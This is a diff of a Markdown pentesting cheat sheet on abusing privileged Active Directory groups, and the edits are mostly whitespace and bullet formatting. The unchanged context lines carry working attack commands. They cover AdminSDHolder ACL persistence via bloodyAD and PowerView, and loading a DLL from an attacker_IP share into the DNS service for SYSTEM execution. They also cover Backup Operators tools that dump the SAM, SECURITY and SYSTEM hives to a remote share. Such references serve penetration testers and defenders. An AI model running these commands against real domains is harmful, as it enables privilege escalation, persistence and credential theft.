@@ -1,10 +1,10 @@
-# Active Directory - Groups 
+# Active Directory - Groups
 
 ## Dangerous Built-in Groups Usage
 
 If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `adminCount` attribute to `0` for the required object.
 
->  The AdminCount attribute is set to `1` automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).
+> The AdminCount attribute is set to `1` automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).
 
 Find users with `AdminCount=1`.
 
@@ -22,7 +22,6 @@ Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 ([adsisearcher]"(AdminCount=1)").findall()
 ```
 
-
 ## AdminSDHolder Attribute
 
 > The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
@@ -32,6 +31,7 @@ If you modify the permissions of **AdminSDHolder**, that permission template wil
 E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
 
 * Windows/Linux:
+
   ```ps1
   bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
 
@@ -40,6 +40,7 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
   ```
 
 * Windows only:
+
   ```ps1
   # Add a user to the AdminSDHolder group:
   Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose
@@ -51,7 +52,6 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
   Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
   ```
 
-
 ## DNS Admins Group
 
 > It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
@@ -59,16 +59,21 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
 :warning: Require privileges to restart the DNS service.
 
 * Enumerate members of DNSAdmins group
-  * Windows/Linux:
+    * Windows/Linux:
+
     ```ps1
     bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive
     ```
-  * Windows only:
+
+    * Windows only:
+
     ```ps1
     Get-NetGroupMember -GroupName "DNSAdmins"
     Get-ADGroupMember -Identity DNSAdmins
     ```
+
 * Change dll loaded by the DNS service
+
     ```ps1
     # with RSAT
     dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
@@ -79,11 +84,15 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
     $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
     Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
     ```
+
 * Check the previous command success
+
     ```ps1
     Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
     ```
+
 * Restart DNS
+
     ```ps1
     sc \\dc01 stop dns
     sc \\dc01 start dns
@@ -93,24 +102,25 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
 
 > The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.
 
-
 ## Backup Operators Group
 
 > Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.
 
 This groups grants the following privileges :
 
-- SeBackup privileges
-- SeRestore privileges
+* SeBackup privileges
+* SeRestore privileges
 
 Get members of the group:
 
 * Windows/Linux:
+
     ```ps1
     bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object "Backup Operators" --attr msds-memberTransitive
     ```
 
 * Windows only:
+
     ```ps1
     PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
     ```
@@ -143,7 +153,6 @@ Retrieve `SAM`,`SECURITY` and `SYSTEM` hives
 
 * [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
 * [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`
-
 
 ## References
 
